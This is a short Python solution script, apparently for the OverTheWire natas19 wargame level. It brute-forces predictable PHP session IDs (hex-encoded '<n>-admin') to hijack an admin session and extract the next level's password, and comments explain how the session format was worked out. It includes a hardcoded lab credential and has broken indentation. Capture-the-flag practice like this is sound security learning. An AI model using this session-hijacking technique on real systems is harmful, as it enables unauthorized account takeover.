#!/bin/python3

import requests
import re
import html.parser
import codecs

    username = 'natas19'
    password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
    url = 'http://%s.natas.labs.overthewire.org?debug=true' % (username)
    data = {"username" : "admin" , "password" : "" , "submit" : "Login"}
    session = requests.Session()
    found = False

for i in range(1,641):
    idval =str(codecs.encode((str(i) + "-admin").encode('utf-8'),'hex'),'utf-8')
    cookies = { "PHPSESSID" : idval}
    response = session.post(url + '', data = data, cookies = cookies,auth = (username,password) )
    content = html.unescape(response.text)
    #print (content)
    print ("Attempting session ID: str = {}-admin hex = {}".format(i,idval))
    if ("You are an admin") in content:
        found = True
        break
    else:
        continue

if found:
    print ("The password is: {}".format(re.findall("Password: (.*)</pre",content)[0]))
else:
    print ("password not found please fix script")


#this one seems similar to the last one but we can't see the source code
#and the session ID that is being given to us is significantly longer
#after playing around with it it looks like the session id is in some part
#defined by the username and password and then encoded into hex
#further testing shows that the password has no effect and only the username changes the session
#decoding into hex I can see that once again the session id has a number between 0 and 640
#but now the username is appended and the whole thing is hex encoded 

#im going to assume the username is admin and then use a version of the previous attack
